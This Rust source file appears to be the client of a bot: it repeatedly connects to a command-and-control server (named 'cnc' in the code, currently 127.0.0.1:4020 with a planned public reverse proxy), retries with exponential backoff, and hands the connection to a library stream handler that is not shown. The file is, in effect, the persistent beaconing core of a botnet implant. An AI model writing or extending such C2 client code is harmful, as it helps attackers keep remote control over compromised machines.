use std::{thread, time::Duration};
use std::net::TcpStream;
use love_bot_library::connection::server_handlers::client_handle_stream;
use log::{error, info};

// testing with local network before public reverse proxy
// const SERVER_IP: &str = "192.168.64.1";
const SERVER_IP: &str = "127.0.0.1";
const SERVER_PORT: u16 = 4020;

// establish connection to server only
fn set_server_connection() {
    let mut retries = 0;

    loop {
        let server_address = format!("{}:{}", SERVER_IP, SERVER_PORT);
        info!("Attempting to connect to server at {}", server_address);

        match TcpStream::connect(&server_address) {
            Ok(stream) => {
                info!("Successfully connected to server");

                // Reset retry counter on success
                retries = 0;


                // Spawn a thread to handle communication with the server
                let handle_thread = thread::spawn(move || {
                    if let Err(e) = client_handle_stream(&stream) {
                        error!("Error handling stream: {}", e);
                    }
                    info!("created thread");
                });

                // Wait for the command to finish (blocking) until stream was successfully ran
                // and handled by read exact inside the handle_stream, if not, it will continue
                // making threads
                if let Err(e) = handle_thread.join() {
                    error!("Stream handler thread panicked: {:?}", e);
                }

                info!("Disconnected from server, attempting to reconnect...");
            }
            Err(e) => {
                error!("Failed to connect to server: {}", e);

                // Increment retries and implement exponential backoff
                retries += 1;
                let wait_time = Duration::from_secs(2_u64.pow(retries.min(6))); // Cap backoff at 64 seconds
                info!("Retrying in {} seconds...", wait_time.as_secs());
                std::thread::sleep(wait_time);
            }
        }
    }
}

fn main() {
    env_logger::init();

    let cnc_connect = thread::spawn(set_server_connection);
    cnc_connect
        .join()
        .expect("The cnc connection has panicked.");
}
